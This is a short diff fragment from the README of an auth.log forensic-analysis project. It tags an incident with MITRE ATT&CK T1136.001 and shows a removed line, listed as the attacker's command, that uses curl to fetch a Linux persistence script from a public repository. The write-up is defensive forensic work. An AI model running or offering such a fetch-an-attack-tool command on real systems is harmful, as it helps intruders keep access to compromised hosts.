@@ -24,4 +24,4 @@ This project involves **forensic analysis of Unix authentication logs (`auth.log
 ✅ **MITRE ATT&CK Sub-technique:** **T1136.001 (Create Account – Local Account)**  
 ✅ **Command Executed by Attacker:**  
    ```bash
-   /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+  
